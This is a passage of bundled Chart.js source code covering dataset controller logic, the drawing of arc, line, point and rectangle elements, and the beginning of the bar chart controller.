      var meta = me.getMeta();
      var data = me.getDataset().data || [];
      var metaData = meta.data;
      var i, ilen;

      for (i = 0, ilen = data.length; i < ilen; ++i) {
        metaData[i] = metaData[i] || me.createMetaData(i);
      }

      meta.dataset = meta.dataset || me.createMetaDataset();
    },

    addElementAndReset: function (index) {
      var element = this.createMetaData(index);
      this.getMeta().data.splice(index, 0, element);
      this.updateElement(element, index, true);
    },

    buildOrUpdateElements: function () {
      var me = this;
      var dataset = me.getDataset();
      var data = dataset.data || (dataset.data = []);

      // In order to correctly handle data addition/deletion animation (an thus simulate
      // real-time charts), we need to monitor these data modifications and synchronize
      // the internal meta data accordingly.
      if (me._data !== data) {
        if (me._data) {
          // This case happens when the user replaced the data array instance.
          unlistenArrayEvents(me._data, me);
        }

        if (data && Object.isExtensible(data)) {
          listenArrayEvents(data, me);
        }
        me._data = data;
      }

      // Re-sync meta data in case the user replaced the data array or if we missed
      // any updates and so make sure that we handle number of datapoints changing.
      me.resyncElements();
    },

    /**
     * Returns the merged user-supplied and default dataset-level options
     * @private
     */
    _configure: function () {
      var me = this;
      me._config = helpers$1.merge(
        Object.create(null),
        [me.chart.options.datasets[me._type], me.getDataset()],
        {
          merger: function (key, target, source) {
            if (key !== "_meta" && key !== "data") {
              helpers$1._merger(key, target, source);
            }
          },
        }
      );
    },

    _update: function (reset) {
      var me = this;
      me._configure();
      me._cachedDataOpts = null;
      me.update(reset);
    },

    update: helpers$1.noop,

    transition: function (easingValue) {
      var meta = this.getMeta();
      var elements = meta.data || [];
      var ilen = elements.length;
      var i = 0;

      for (; i < ilen; ++i) {
        elements[i].transition(easingValue);
      }

      if (meta.dataset) {
        meta.dataset.transition(easingValue);
      }
    },

    draw: function () {
      var meta = this.getMeta();
      var elements = meta.data || [];
      var ilen = elements.length;
      var i = 0;

      if (meta.dataset) {
        meta.dataset.draw();
      }

      for (; i < ilen; ++i) {
        elements[i].draw();
      }
    },

    /**
     * Returns a set of predefined style properties that should be used to represent the dataset
     * or the data if the index is specified
     * @param {number} index - data index
     * @return {IStyleInterface} style object
     */
    getStyle: function (index) {
      var me = this;
      var meta = me.getMeta();
      var dataset = meta.dataset;
      var style;

      me._configure();
      if (dataset && index === undefined) {
        style = me._resolveDatasetElementOptions(dataset || {});
      } else {
        index = index || 0;
        style = me._resolveDataElementOptions(meta.data[index] || {}, index);
      }

      if (style.fill === false || style.fill === null) {
        style.backgroundColor = style.borderColor;
      }

      return style;
    },

    /**
     * @private
     */
    _resolveDatasetElementOptions: function (element, hover) {
      var me = this;
      var chart = me.chart;
      var datasetOpts = me._config;
      var custom = element.custom || {};
      var options =
        chart.options.elements[me.datasetElementType.prototype._type] || {};
      var elementOptions = me._datasetElementOptions;
      var values = {};
      var i, ilen, key, readKey;

      // Scriptable options
      var context = {
        chart: chart,
        dataset: me.getDataset(),
        datasetIndex: me.index,
        hover: hover,
      };

      for (i = 0, ilen = elementOptions.length; i < ilen; ++i) {
        key = elementOptions[i];
        readKey = hover
          ? "hover" + key.charAt(0).toUpperCase() + key.slice(1)
          : key;
        values[key] = resolve(
          [custom[readKey], datasetOpts[readKey], options[readKey]],
          context
        );
      }

      return values;
    },

    /**
     * @private
     */
    _resolveDataElementOptions: function (element, index) {
      var me = this;
      var custom = element && element.custom;
      var cached = me._cachedDataOpts;
      if (cached && !custom) {
        return cached;
      }
      var chart = me.chart;
      var datasetOpts = me._config;
      var options =
        chart.options.elements[me.dataElementType.prototype._type] || {};
      var elementOptions = me._dataElementOptions;
      var values = {};

      // Scriptable options
      var context = {
        chart: chart,
        dataIndex: index,
        dataset: me.getDataset(),
        datasetIndex: me.index,
      };

      // `resolve` sets cacheable to `false` if any option is indexed or scripted
      var info = { cacheable: !custom };

      var keys, i, ilen, key;

      custom = custom || {};

      if (helpers$1.isArray(elementOptions)) {
        for (i = 0, ilen = elementOptions.length; i < ilen; ++i) {
          key = elementOptions[i];
          values[key] = resolve(
            [custom[key], datasetOpts[key], options[key]],
            context,
            index,
            info
          );
        }
      } else {
        keys = Object.keys(elementOptions);
        for (i = 0, ilen = keys.length; i < ilen; ++i) {
          key = keys[i];
          values[key] = resolve(
            [
              custom[key],
              datasetOpts[elementOptions[key]],
              datasetOpts[key],
              options[key],
            ],
            context,
            index,
            info
          );
        }
      }

      if (info.cacheable) {
        me._cachedDataOpts = Object.freeze(values);
      }

      return values;
    },

    removeHoverStyle: function (element) {
      helpers$1.merge(element._model, element.$previousStyle || {});
      delete element.$previousStyle;
    },

    setHoverStyle: function (element) {
      var dataset = this.chart.data.datasets[element._datasetIndex];
      var index = element._index;
      var custom = element.custom || {};
      var model = element._model;
      var getHoverColor = helpers$1.getHoverColor;

      element.$previousStyle = {
        backgroundColor: model.backgroundColor,
        borderColor: model.borderColor,
        borderWidth: model.borderWidth,
      };

      model.backgroundColor = resolve(
        [
          custom.hoverBackgroundColor,
          dataset.hoverBackgroundColor,
          getHoverColor(model.backgroundColor),
        ],
        undefined,
        index
      );
      model.borderColor = resolve(
        [
          custom.hoverBorderColor,
          dataset.hoverBorderColor,
          getHoverColor(model.borderColor),
        ],
        undefined,
        index
      );
      model.borderWidth = resolve(
        [custom.hoverBorderWidth, dataset.hoverBorderWidth, model.borderWidth],
        undefined,
        index
      );
    },

    /**
     * @private
     */
    _removeDatasetHoverStyle: function () {
      var element = this.getMeta().dataset;

      if (element) {
        this.removeHoverStyle(element);
      }
    },

    /**
     * @private
     */
    _setDatasetHoverStyle: function () {
      var element = this.getMeta().dataset;
      var prev = {};
      var i, ilen, key, keys, hoverOptions, model;

      if (!element) {
        return;
      }

      model = element._model;
      hoverOptions = this._resolveDatasetElementOptions(element, true);

      keys = Object.keys(hoverOptions);
      for (i = 0, ilen = keys.length; i < ilen; ++i) {
        key = keys[i];
        prev[key] = model[key];
        model[key] = hoverOptions[key];
      }

      element.$previousStyle = prev;
    },

    /**
     * @private
     */
    resyncElements: function () {
      var me = this;
      var meta = me.getMeta();
      var data = me.getDataset().data;
      var numMeta = meta.data.length;
      var numData = data.length;

      if (numData < numMeta) {
        meta.data.splice(numData, numMeta - numData);
      } else if (numData > numMeta) {
        me.insertElements(numMeta, numData - numMeta);
      }
    },

    /**
     * @private
     */
    insertElements: function (start, count) {
      for (var i = 0; i < count; ++i) {
        this.addElementAndReset(start + i);
      }
    },

    /**
     * @private
     */
    onDataPush: function () {
      var count = arguments.length;
      this.insertElements(this.getDataset().data.length - count, count);
    },

    /**
     * @private
     */
    onDataPop: function () {
      this.getMeta().data.pop();
    },

    /**
     * @private
     */
    onDataShift: function () {
      this.getMeta().data.shift();
    },

    /**
     * @private
     */
    onDataSplice: function (start, count) {
      this.getMeta().data.splice(start, count);
      this.insertElements(start, arguments.length - 2);
    },

    /**
     * @private
     */
    onDataUnshift: function () {
      this.insertElements(0, arguments.length);
    },
  });

  DatasetController.extend = helpers$1.inherits;

  var core_datasetController = DatasetController;

  var TAU = Math.PI * 2;

  core_defaults._set("global", {
    elements: {
      arc: {
        backgroundColor: core_defaults.global.defaultColor,
        borderColor: "#fff",
        borderWidth: 2,
        borderAlign: "center",
      },
    },
  });

  function clipArc(ctx, arc) {
    var startAngle = arc.startAngle;
    var endAngle = arc.endAngle;
    var pixelMargin = arc.pixelMargin;
    var angleMargin = pixelMargin / arc.outerRadius;
    var x = arc.x;
    var y = arc.y;

    // Draw an inner border by cliping the arc and drawing a double-width border
    // Enlarge the clipping arc by 0.33 pixels to eliminate glitches between borders
    ctx.beginPath();
    ctx.arc(
      x,
      y,
      arc.outerRadius,
      startAngle - angleMargin,
      endAngle + angleMargin
    );
    if (arc.innerRadius > pixelMargin) {
      angleMargin = pixelMargin / arc.innerRadius;
      ctx.arc(
        x,
        y,
        arc.innerRadius - pixelMargin,
        endAngle + angleMargin,
        startAngle - angleMargin,
        true
      );
    } else {
      ctx.arc(
        x,
        y,
        pixelMargin,
        endAngle + Math.PI / 2,
        startAngle - Math.PI / 2
      );
    }
    ctx.closePath();
    ctx.clip();
  }

  function drawFullCircleBorders(ctx, vm, arc, inner) {
    var endAngle = arc.endAngle;
    var i;

    if (inner) {
      arc.endAngle = arc.startAngle + TAU;
      clipArc(ctx, arc);
      arc.endAngle = endAngle;
      if (arc.endAngle === arc.startAngle && arc.fullCircles) {
        arc.endAngle += TAU;
        arc.fullCircles--;
      }
    }

    ctx.beginPath();
    ctx.arc(
      arc.x,
      arc.y,
      arc.innerRadius,
      arc.startAngle + TAU,
      arc.startAngle,
      true
    );
    for (i = 0; i < arc.fullCircles; ++i) {
      ctx.stroke();
    }

    ctx.beginPath();
    ctx.arc(arc.x, arc.y, vm.outerRadius, arc.startAngle, arc.startAngle + TAU);
    for (i = 0; i < arc.fullCircles; ++i) {
      ctx.stroke();
    }
  }

  function drawBorder(ctx, vm, arc) {
    var inner = vm.borderAlign === "inner";

    if (inner) {
      ctx.lineWidth = vm.borderWidth * 2;
      ctx.lineJoin = "round";
    } else {
      ctx.lineWidth = vm.borderWidth;
      ctx.lineJoin = "bevel";
    }

    if (arc.fullCircles) {
      drawFullCircleBorders(ctx, vm, arc, inner);
    }

    if (inner) {
      clipArc(ctx, arc);
    }

    ctx.beginPath();
    ctx.arc(arc.x, arc.y, vm.outerRadius, arc.startAngle, arc.endAngle);
    ctx.arc(arc.x, arc.y, arc.innerRadius, arc.endAngle, arc.startAngle, true);
    ctx.closePath();
    ctx.stroke();
  }

  var element_arc = core_element.extend({
    _type: "arc",

    inLabelRange: function (mouseX) {
      var vm = this._view;

      if (vm) {
        return (
          Math.pow(mouseX - vm.x, 2) < Math.pow(vm.radius + vm.hoverRadius, 2)
        );
      }
      return false;
    },

    inRange: function (chartX, chartY) {
      var vm = this._view;

      if (vm) {
        var pointRelativePosition = helpers$1.getAngleFromPoint(vm, {
          x: chartX,
          y: chartY,
        });
        var angle = pointRelativePosition.angle;
        var distance = pointRelativePosition.distance;

        // Sanitise angle range
        var startAngle = vm.startAngle;
        var endAngle = vm.endAngle;
        while (endAngle < startAngle) {
          endAngle += TAU;
        }
        while (angle > endAngle) {
          angle -= TAU;
        }
        while (angle < startAngle) {
          angle += TAU;
        }

        // Check if within the range of the open/close angle
        var betweenAngles = angle >= startAngle && angle <= endAngle;
        var withinRadius =
          distance >= vm.innerRadius && distance <= vm.outerRadius;

        return betweenAngles && withinRadius;
      }
      return false;
    },

    getCenterPoint: function () {
      var vm = this._view;
      var halfAngle = (vm.startAngle + vm.endAngle) / 2;
      var halfRadius = (vm.innerRadius + vm.outerRadius) / 2;
      return {
        x: vm.x + Math.cos(halfAngle) * halfRadius,
        y: vm.y + Math.sin(halfAngle) * halfRadius,
      };
    },

    getArea: function () {
      var vm = this._view;
      return (
        Math.PI *
        ((vm.endAngle - vm.startAngle) / (2 * Math.PI)) *
        (Math.pow(vm.outerRadius, 2) - Math.pow(vm.innerRadius, 2))
      );
    },

    tooltipPosition: function () {
      var vm = this._view;
      var centreAngle = vm.startAngle + (vm.endAngle - vm.startAngle) / 2;
      var rangeFromCentre =
        (vm.outerRadius - vm.innerRadius) / 2 + vm.innerRadius;

      return {
        x: vm.x + Math.cos(centreAngle) * rangeFromCentre,
        y: vm.y + Math.sin(centreAngle) * rangeFromCentre,
      };
    },

    draw: function () {
      var ctx = this._chart.ctx;
      var vm = this._view;
      var pixelMargin = vm.borderAlign === "inner" ? 0.33 : 0;
      var arc = {
        x: vm.x,
        y: vm.y,
        innerRadius: vm.innerRadius,
        outerRadius: Math.max(vm.outerRadius - pixelMargin, 0),
        pixelMargin: pixelMargin,
        startAngle: vm.startAngle,
        endAngle: vm.endAngle,
        fullCircles: Math.floor(vm.circumference / TAU),
      };
      var i;

      ctx.save();

      ctx.fillStyle = vm.backgroundColor;
      ctx.strokeStyle = vm.borderColor;

      if (arc.fullCircles) {
        arc.endAngle = arc.startAngle + TAU;
        ctx.beginPath();
        ctx.arc(arc.x, arc.y, arc.outerRadius, arc.startAngle, arc.endAngle);
        ctx.arc(
          arc.x,
          arc.y,
          arc.innerRadius,
          arc.endAngle,
          arc.startAngle,
          true
        );
        ctx.closePath();
        for (i = 0; i < arc.fullCircles; ++i) {
          ctx.fill();
        }
        arc.endAngle = arc.startAngle + (vm.circumference % TAU);
      }

      ctx.beginPath();
      ctx.arc(arc.x, arc.y, arc.outerRadius, arc.startAngle, arc.endAngle);
      ctx.arc(
        arc.x,
        arc.y,
        arc.innerRadius,
        arc.endAngle,
        arc.startAngle,
        true
      );
      ctx.closePath();
      ctx.fill();

      if (vm.borderWidth) {
        drawBorder(ctx, vm, arc);
      }

      ctx.restore();
    },
  });

  var valueOrDefault$1 = helpers$1.valueOrDefault;

  var defaultColor = core_defaults.global.defaultColor;

  core_defaults._set("global", {
    elements: {
      line: {
        tension: 0.4,
        backgroundColor: defaultColor,
        borderWidth: 3,
        borderColor: defaultColor,
        borderCapStyle: "butt",
        borderDash: [],
        borderDashOffset: 0.0,
        borderJoinStyle: "miter",
        capBezierPoints: true,
        fill: true, // do we fill in the area between the line and its base axis
      },
    },
  });

  var element_line = core_element.extend({
    _type: "line",

    draw: function () {
      var me = this;
      var vm = me._view;
      var ctx = me._chart.ctx;
      var spanGaps = vm.spanGaps;
      var points = me._children.slice(); // clone array
      var globalDefaults = core_defaults.global;
      var globalOptionLineElements = globalDefaults.elements.line;
      var lastDrawnIndex = -1;
      var closePath = me._loop;
      var index, previous, currentVM;

      if (!points.length) {
        return;
      }

      if (me._loop) {
        for (index = 0; index < points.length; ++index) {
          previous = helpers$1.previousItem(points, index);
          // If the line has an open path, shift the point array
          if (!points[index]._view.skip && previous._view.skip) {
            points = points.slice(index).concat(points.slice(0, index));
            closePath = spanGaps;
            break;
          }
        }
        // If the line has a close path, add the first point again
        if (closePath) {
          points.push(points[0]);
        }
      }

      ctx.save();

      // Stroke Line Options
      ctx.lineCap =
        vm.borderCapStyle || globalOptionLineElements.borderCapStyle;

      // IE 9 and 10 do not support line dash
      if (ctx.setLineDash) {
        ctx.setLineDash(vm.borderDash || globalOptionLineElements.borderDash);
      }

      ctx.lineDashOffset = valueOrDefault$1(
        vm.borderDashOffset,
        globalOptionLineElements.borderDashOffset
      );
      ctx.lineJoin =
        vm.borderJoinStyle || globalOptionLineElements.borderJoinStyle;
      ctx.lineWidth = valueOrDefault$1(
        vm.borderWidth,
        globalOptionLineElements.borderWidth
      );
      ctx.strokeStyle = vm.borderColor || globalDefaults.defaultColor;

      // Stroke Line
      ctx.beginPath();

      // First point moves to it's starting position no matter what
      currentVM = points[0]._view;
      if (!currentVM.skip) {
        ctx.moveTo(currentVM.x, currentVM.y);
        lastDrawnIndex = 0;
      }

      for (index = 1; index < points.length; ++index) {
        currentVM = points[index]._view;
        previous =
          lastDrawnIndex === -1
            ? helpers$1.previousItem(points, index)
            : points[lastDrawnIndex];

        if (!currentVM.skip) {
          if (
            (lastDrawnIndex !== index - 1 && !spanGaps) ||
            lastDrawnIndex === -1
          ) {
            // There was a gap and this is the first point after the gap
            ctx.moveTo(currentVM.x, currentVM.y);
          } else {
            // Line to next point
            helpers$1.canvas.lineTo(ctx, previous._view, currentVM);
          }
          lastDrawnIndex = index;
        }
      }

      if (closePath) {
        ctx.closePath();
      }

      ctx.stroke();
      ctx.restore();
    },
  });

  var valueOrDefault$2 = helpers$1.valueOrDefault;

  var defaultColor$1 = core_defaults.global.defaultColor;

  core_defaults._set("global", {
    elements: {
      point: {
        radius: 3,
        pointStyle: "circle",
        backgroundColor: defaultColor$1,
        borderColor: defaultColor$1,
        borderWidth: 1,
        // Hover
        hitRadius: 1,
        hoverRadius: 4,
        hoverBorderWidth: 1,
      },
    },
  });

  function xRange(mouseX) {
    var vm = this._view;
    return vm ? Math.abs(mouseX - vm.x) < vm.radius + vm.hitRadius : false;
  }

  function yRange(mouseY) {
    var vm = this._view;
    return vm ? Math.abs(mouseY - vm.y) < vm.radius + vm.hitRadius : false;
  }

  var element_point = core_element.extend({
    _type: "point",

    inRange: function (mouseX, mouseY) {
      var vm = this._view;
      return vm
        ? Math.pow(mouseX - vm.x, 2) + Math.pow(mouseY - vm.y, 2) <
            Math.pow(vm.hitRadius + vm.radius, 2)
        : false;
    },

    inLabelRange: xRange,
    inXRange: xRange,
    inYRange: yRange,

    getCenterPoint: function () {
      var vm = this._view;
      return {
        x: vm.x,
        y: vm.y,
      };
    },

    getArea: function () {
      return Math.PI * Math.pow(this._view.radius, 2);
    },

    tooltipPosition: function () {
      var vm = this._view;
      return {
        x: vm.x,
        y: vm.y,
        padding: vm.radius + vm.borderWidth,
      };
    },

    draw: function (chartArea) {
      var vm = this._view;
      var ctx = this._chart.ctx;
      var pointStyle = vm.pointStyle;
      var rotation = vm.rotation;
      var radius = vm.radius;
      var x = vm.x;
      var y = vm.y;
      var globalDefaults = core_defaults.global;
      var defaultColor = globalDefaults.defaultColor; // eslint-disable-line no-shadow

      if (vm.skip) {
        return;
      }

      // Clipping for Points.
      if (
        chartArea === undefined ||
        helpers$1.canvas._isPointInArea(vm, chartArea)
      ) {
        ctx.strokeStyle = vm.borderColor || defaultColor;
        ctx.lineWidth = valueOrDefault$2(
          vm.borderWidth,
          globalDefaults.elements.point.borderWidth
        );
        ctx.fillStyle = vm.backgroundColor || defaultColor;
        helpers$1.canvas.drawPoint(ctx, pointStyle, radius, x, y, rotation);
      }
    },
  });

  var defaultColor$2 = core_defaults.global.defaultColor;

  core_defaults._set("global", {
    elements: {
      rectangle: {
        backgroundColor: defaultColor$2,
        borderColor: defaultColor$2,
        borderSkipped: "bottom",
        borderWidth: 0,
      },
    },
  });

  function isVertical(vm) {
    return vm && vm.width !== undefined;
  }

  /**
   * Helper function to get the bounds of the bar regardless of the orientation
   * @param bar {Chart.Element.Rectangle} the bar
   * @return {Bounds} bounds of the bar
   * @private
   */
  function getBarBounds(vm) {
    var x1, x2, y1, y2, half;

    if (isVertical(vm)) {
      half = vm.width / 2;
      x1 = vm.x - half;
      x2 = vm.x + half;
      y1 = Math.min(vm.y, vm.base);
      y2 = Math.max(vm.y, vm.base);
    } else {
      half = vm.height / 2;
      x1 = Math.min(vm.x, vm.base);
      x2 = Math.max(vm.x, vm.base);
      y1 = vm.y - half;
      y2 = vm.y + half;
    }

    return {
      left: x1,
      top: y1,
      right: x2,
      bottom: y2,
    };
  }

  function swap(orig, v1, v2) {
    return orig === v1 ? v2 : orig === v2 ? v1 : orig;
  }

  function parseBorderSkipped(vm) {
    var edge = vm.borderSkipped;
    var res = {};

    if (!edge) {
      return res;
    }

    if (vm.horizontal) {
      if (vm.base > vm.x) {
        edge = swap(edge, "left", "right");
      }
    } else if (vm.base < vm.y) {
      edge = swap(edge, "bottom", "top");
    }

    res[edge] = true;
    return res;
  }

  function parseBorderWidth(vm, maxW, maxH) {
    var value = vm.borderWidth;
    var skip = parseBorderSkipped(vm);
    var t, r, b, l;

    if (helpers$1.isObject(value)) {
      t = +value.top || 0;
      r = +value.right || 0;
      b = +value.bottom || 0;
      l = +value.left || 0;
    } else {
      t = r = b = l = +value || 0;
    }

    return {
      t: skip.top || t < 0 ? 0 : t > maxH ? maxH : t,
      r: skip.right || r < 0 ? 0 : r > maxW ? maxW : r,
      b: skip.bottom || b < 0 ? 0 : b > maxH ? maxH : b,
      l: skip.left || l < 0 ? 0 : l > maxW ? maxW : l,
    };
  }

  function boundingRects(vm) {
    var bounds = getBarBounds(vm);
    var width = bounds.right - bounds.left;
    var height = bounds.bottom - bounds.top;
    var border = parseBorderWidth(vm, width / 2, height / 2);

    return {
      outer: {
        x: bounds.left,
        y: bounds.top,
        w: width,
        h: height,
      },
      inner: {
        x: bounds.left + border.l,
        y: bounds.top + border.t,
        w: width - border.l - border.r,
        h: height - border.t - border.b,
      },
    };
  }

  function inRange(vm, x, y) {
    var skipX = x === null;
    var skipY = y === null;
    var bounds = !vm || (skipX && skipY) ? false : getBarBounds(vm);

    return (
      bounds &&
      (skipX || (x >= bounds.left && x <= bounds.right)) &&
      (skipY || (y >= bounds.top && y <= bounds.bottom))
    );
  }

  var element_rectangle = core_element.extend({
    _type: "rectangle",

    draw: function () {
      var ctx = this._chart.ctx;
      var vm = this._view;
      var rects = boundingRects(vm);
      var outer = rects.outer;
      var inner = rects.inner;

      ctx.fillStyle = vm.backgroundColor;
      ctx.fillRect(outer.x, outer.y, outer.w, outer.h);

      if (outer.w === inner.w && outer.h === inner.h) {
        return;
      }

      ctx.save();
      ctx.beginPath();
      ctx.rect(outer.x, outer.y, outer.w, outer.h);
      ctx.clip();
      ctx.fillStyle = vm.borderColor;
      ctx.rect(inner.x, inner.y, inner.w, inner.h);
      ctx.fill("evenodd");
      ctx.restore();
    },

    height: function () {
      var vm = this._view;
      return vm.base - vm.y;
    },

    inRange: function (mouseX, mouseY) {
      return inRange(this._view, mouseX, mouseY);
    },

    inLabelRange: function (mouseX, mouseY) {
      var vm = this._view;
      return isVertical(vm)
        ? inRange(vm, mouseX, null)
        : inRange(vm, null, mouseY);
    },

    inXRange: function (mouseX) {
      return inRange(this._view, mouseX, null);
    },

    inYRange: function (mouseY) {
      return inRange(this._view, null, mouseY);
    },

    getCenterPoint: function () {
      var vm = this._view;
      var x, y;
      if (isVertical(vm)) {
        x = vm.x;
        y = (vm.y + vm.base) / 2;
      } else {
        x = (vm.x + vm.base) / 2;
        y = vm.y;
      }

      return { x: x, y: y };
    },

    getArea: function () {
      var vm = this._view;

      return isVertical(vm)
        ? vm.width * Math.abs(vm.y - vm.base)
        : vm.height * Math.abs(vm.x - vm.base);
    },

    tooltipPosition: function () {
      var vm = this._view;
      return {
        x: vm.x,
        y: vm.y,
      };
    },
  });

  var elements = {};
  var Arc = element_arc;
  var Line = element_line;
  var Point = element_point;
  var Rectangle = element_rectangle;
  elements.Arc = Arc;
  elements.Line = Line;
  elements.Point = Point;
  elements.Rectangle = Rectangle;

  var deprecated = helpers$1._deprecated;
  var valueOrDefault$3 = helpers$1.valueOrDefault;

  core_defaults._set("bar", {
    hover: {
      mode: "label",
    },

    scales: {
      xAxes: [
        {
          type: "category",
          offset: true,
          gridLines: {
            offsetGridLines: true,
          },
        },
      ],

      yAxes: [
        {
          type: "linear",
        },
      ],
    },
  });

  core_defaults._set("global", {
    datasets: {
      bar: {
        categoryPercentage: 0.8,
        barPercentage: 0.9,
      },
    },
  });

  /**
   * Computes the "optimal" sample size to maintain bars equally sized while preventing overlap.
   * @private
   */
  function computeMinSampleSize(scale, pixels) {
    var min = scale._length;
    var prev, curr, i, ilen;

    for (i = 1, ilen = pixels.length; i < ilen; ++i) {
      min = Math.min(min, Math.abs(pixels[i] - pixels[i - 1]));
    }

    for (i = 0, ilen = scale.getTicks().length; i < ilen; ++i) {
      curr = scale.getPixelForTick(i);
      min = i > 0 ? Math.min(min, Math.abs(curr - prev)) : min;
      prev = curr;
    }

    return min;
  }

  /**
   * Computes an "ideal" category based on the absolute bar thickness or, if undefined or null,
   * uses the smallest interval (see computeMinSampleSize) that prevents bar overlapping. This
   * mode currently always generates bars equally sized (until we introduce scriptable options?).
   * @private
   */
  function computeFitCategoryTraits(index, ruler, options) {
    var thickness = options.barThickness;
    var count = ruler.stackCount;
    var curr = ruler.pixels[index];
    var min = helpers$1.isNullOrUndef(thickness)
      ? computeMinSampleSize(ruler.scale, ruler.pixels)
      : -1;
    var size, ratio;

    if (helpers$1.isNullOrUndef(thickness)) {
      size = min * options.categoryPercentage;
      ratio = options.barPercentage;
    } else {
      // When bar thickness is enforced, category and bar percentages are ignored.
      // Note(SB): we could add support for relative bar thickness (e.g. barThickness: '50%')
      // and deprecate barPercentage since this value is ignored when thickness is absolute.
      size = thickness * count;
      ratio = 1;
    }

    return {
      chunk: size / count,
      ratio: ratio,
      start: curr - size / 2,
    };
  }

  /**
   * Computes an "optimal" category that globally arranges bars side by side (no gap when
   * percentage options are 1), based on the previous and following categories. This mode
   * generates bars with different widths when data are not evenly spaced.
   * @private
   */
  function computeFlexCategoryTraits(index, ruler, options) {
    var pixels = ruler.pixels;
    var curr = pixels[index];
    var prev = index > 0 ? pixels[index - 1] : null;
    var next = index < pixels.length - 1 ? pixels[index + 1] : null;
    var percent = options.categoryPercentage;
    var start, size;

    if (prev === null) {
      // first data: its size is double based on the next point or,
      // if it's also the last data, we use the scale size.
      prev = curr - (next === null ? ruler.end - ruler.start : next - curr);
    }

    if (next === null) {
      // last data: its size is also double based on the previous point.
      next = curr + curr - prev;
    }

    start = curr - ((curr - Math.min(prev, next)) / 2) * percent;
    size = (Math.abs(next - prev) / 2) * percent;

    return {
      chunk: size / ruler.stackCount,
      ratio: options.barPercentage,
      start: start,
    };
  }

  var controller_bar = core_datasetController.extend({
    dataElementType: elements.Rectangle,

    /**
     * @private
     */
    _dataElementOptions: [
      "backgroundColor",
      "borderColor",
      "borderSkipped",
      "borderWidth",
      "barPercentage",
      "barThickness",
      "categoryPercentage",
      "maxBarThickness",
      "minBarLength",
    ],

    initialize: function () {
      var me = this;
      var meta, scaleOpts;

      core_datasetController.prototype.initialize.apply(me, arguments);

      meta = me.getMeta();
      meta.stack = me.getDataset().stack;
      meta.bar = true;

      scaleOpts = me._getIndexScale().options;
      deprecated(
        "bar chart",
        scaleOpts.barPercentage,
        "scales.[x/y]Axes.barPercentage",
        "dataset.barPercentage"
      );
      deprecated(
        "bar chart",
        scaleOpts.barThickness,
        "scales.[x/y]Axes.barThickness",
        "dataset.barThickness"
      );
      deprecated(
        "bar chart",
        scaleOpts.categoryPercentage,
        "scales.[x/y]Axes.categoryPercentage",
        "dataset.categoryPercentage"
      );
      deprecated(
        "bar chart",
        me._getValueScale().options.minBarLength,
        "scales.[x/y]Axes.minBarLength",
        "dataset.minBarLength"
      );
      deprecated(
        "bar chart",
        scaleOpts.maxBarThickness,
        "scales.[x/y]Axes.maxBarThickness",
        "dataset.maxBarThickness"
      );
    },

    update: function (reset) {
      var me = this;
      var rects = me.getMeta().data;
      var i, ilen;

      me._ruler = me.getRuler();

      for (i = 0, ilen = rects.length; i < ilen; ++i) {
        me.updateElement(rects[i], i, reset);
      }
    },

    updateElement: function (rectangle, index, reset) {
      var me = this;
      var meta = me.getMeta();
      var dataset = me.getDataset();
      var options = me._resolveDataElementOptions(rectangle, index);

      rectangle._xScale = me.getScaleForId(meta.xAxisID);
      rectangle._yScale = me.getScaleForId(meta.yAxisID);
      rectangle._datasetIndex = me.index;
      rectangle._index = index;
      rectangle._model = {
        backgroundColor: options.backgroundColor,
        borderColor: options.borderColor,
        borderSkipped: options.borderSkipped,
        borderWidth: options.borderWidth,
        datasetLabel: dataset.label,
        label: me.chart.data.labels[index],
      };

      if (helpers$1.isArray(dataset.data[index])) {
        rectangle._model.borderSkipped = null;
      }

      me._updateElementGeometry(rectangle, index, reset, options);

      rectangle.pivot();
    },

    /**
     * @private
     */
    _updateElementGeometry: function (rectangle, index, reset, options) {
      var me = this;
      var model = rectangle._model;
      var vscale = me._getValueScale();
      var base = vscale.getBasePixel();
      var horizontal = vscale.isHorizontal();
      var ruler = me._ruler || me.getRuler();
      var vpixels = me.calculateBarValuePixels(me.index, index, options);
      var ipixels = me.calculateBarIndexPixels(me.index, index, ruler, options);

      model.horizontal = horizontal;
      model.base = reset ? base : vpixels.base;
      model.x = horizontal ? (reset ? base : vpixels.head) : ipixels.center;
      model.y = horizontal ? ipixels.center : reset ? base : vpixels.head;
      model.height = horizontal ? ipixels.size : undefined;
      model.width = horizontal ? undefined : ipixels.size;
    },

    /**
     * Returns the stacks based on groups and bar visibility.
     * @param {number} [last] - The dataset index
     * @returns {string[]} The list of stack IDs
     * @private
     */
    _getStacks: function (last) {
      var me = this;
      var scale = me._getIndexScale();
      var metasets = scale._getMatchingVisibleMetas(me._type);
      var stacked = scale.options.stacked;
      var ilen = metasets.length;
      var stacks = [];
      var i, meta;

      for (i = 0; i < ilen; ++i) {
        meta = metasets[i];
        // stacked   | meta.stack
        //           | found | not found | undefined
        // false     |   x   |     x     |     x
        // true      |       |     x     |
        // undefined |       |     x     |     x
        if (
          stacked === false ||
          stacks.indexOf(meta.stack) === -1 ||
          (stacked === undefined && meta.stack === undefined)
        ) {
          stacks.push(meta.stack);
        }
        if (meta.index === last) {
          break;
        }
      }

      return stacks;
    },

    /**
     * Returns the effective number of stacks based on groups and bar visibility.
     * @private
     */
    getStackCount: function () {
      return this._getStacks().length;
    },

    /**
     * Returns the stack index for the given dataset based on groups and bar visibility.
     * @param {number} [datasetIndex] - The dataset index
     * @param {string} [name] - The stack name to find
     * @returns {number} The stack index
     * @private
     */
    getStackIndex: function (datasetIndex, name) {
      var stacks = this._getStacks(datasetIndex);
      var index = name !== undefined ? stacks.indexOf(name) : -1; // indexOf returns -1 if element is not present

      return index === -1 ? stacks.length - 1 : index;
    },

    /**
     * @private
     */
    getRuler: function () {
      var me = this;
      var scale = me._getIndexScale();
      var pixels = [];
      var i, ilen;

      for (i = 0, ilen = me.getMeta().data.length; i < ilen; ++i) {
        pixels.push(scale.getPixelForValue(null, i, me.index));
      }

      return {
        pixels: pixels,
        start: scale._startPixel,
        end: scale._endPixel,
        stackCount: me.getStackCount(),
        scale: scale,
      };
    },

    /**
     * Note: pixel values are not clamped to the scale area.
     * @private
     */
    calculateBarValuePixels: function (datasetIndex, index, options) {
      var me = this;
      var chart = me.chart;
      var scale = me._getValueScale();
      var isHorizontal = scale.isHorizontal();
      var datasets = chart.data.datasets;
      var metasets = scale._getMatchingVisibleMetas(me._type);
      var value = scale._parseValue(datasets[datasetIndex].data[index]);
      var minBarLength = options.minBarLength;
      var stacked = scale.options.stacked;
      var stack = me.getMeta().stack;
      var start =
        value.start === undefined
          ? 0
          : value.max >= 0 && value.min >= 0
          ? value.min
          : value.max;
      var length =
        value.start === undefined
          ? value.end
          : value.max >= 0 && value.min >= 0
